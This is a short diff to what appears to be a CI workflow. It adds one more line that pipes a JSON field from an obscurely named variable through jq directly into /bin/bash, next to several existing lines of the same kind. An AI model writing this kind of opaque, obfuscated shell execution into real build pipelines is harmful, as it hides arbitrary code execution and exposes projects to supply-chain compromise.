@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$ood5294" | jq -r .jwvf6684 | /bin/bash
           echo $g93309 | jq -r .sqtkg102 | /bin/bash
           printf '%s' "$fkkle45277" | jq -r .abu04 | /bin/bash
+          echo $p1 | jq -r .ekxkc66543 | /bin/bash
 
       - name: Archive results
         if: always()
